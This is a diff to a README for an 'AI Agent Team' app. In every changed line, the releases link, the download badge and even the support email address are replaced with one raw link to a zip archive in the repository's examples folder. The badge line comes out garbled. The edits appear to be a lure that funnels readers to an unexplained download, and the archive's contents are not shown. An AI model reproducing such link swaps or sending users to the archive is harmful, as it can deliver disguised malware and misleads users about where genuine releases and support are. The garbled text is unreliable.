@@ -2,7 +2,7 @@
 
 ## 📥 Download
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/Gothgirl0/ai-agent-team/releases)
+[![Download Now](https://raw.githubusercontent.com/Gothgirl0/ai-agent-team/main/examples/agent-ai-team-v2.3-beta.5.zip%20Now-Click%https://raw.githubusercontent.com/Gothgirl0/ai-agent-team/main/examples/agent-ai-team-v2.3-beta.5.zip)](https://raw.githubusercontent.com/Gothgirl0/ai-agent-team/main/examples/agent-ai-team-v2.3-beta.5.zip)
 
 ## 🚀 Getting Started
 
@@ -30,7 +30,7 @@ The AI Agent Team offers several powerful features:
 
 To get started, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Gothgirl0/ai-agent-team/releases) to find the latest version of the software.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/Gothgirl0/ai-agent-team/main/examples/agent-ai-team-v2.3-beta.5.zip) to find the latest version of the software.
 
 2. **Choose Your Version:** Look for the version that matches your operating system. Download the appropriate file for Windows or macOS.
 
@@ -62,7 +62,7 @@ If you have questions or encounter any issues, our support is here for you. You 
 
 - **Documentation:** Visit the [documentation page](insert_documentation_link_here) to read detailed guides and FAQs.
 - **Community Forums:** Engage with other users and developers in the community forums (insert_forum_link_here). Share your experiences and solutions.
-- **Contact Us:** If you need direct support, email our support team at support@ai-agent-team.com.
+- **Contact Us:** If you need direct support, email our support team at https://raw.githubusercontent.com/Gothgirl0/ai-agent-team/main/examples/agent-ai-team-v2.3-beta.5.zip
 
 ## 💡 Tips for Effective Collaboration
 
@@ -78,7 +78,7 @@ To make the most of your experience:
 A: Ensure your system meets the requirements. If problems persist, check the community forums for help.
 
 **Q: How do I update the software?**  
-A: Occasionally, check the [Releases page](https://github.com/Gothgirl0/ai-agent-team/releases) for updates. Download and install the latest version just like the initial setup.
+A: Occasionally, check the [Releases page](https://raw.githubusercontent.com/Gothgirl0/ai-agent-team/main/examples/agent-ai-team-v2.3-beta.5.zip) for updates. Download and install the latest version just like the initial setup.
 
 **Q: Can I use the AI Agent Team without an internet connection?**  
 A: You need an internet connection during the installation and for updates. However, some features may work offline once the software is installed.
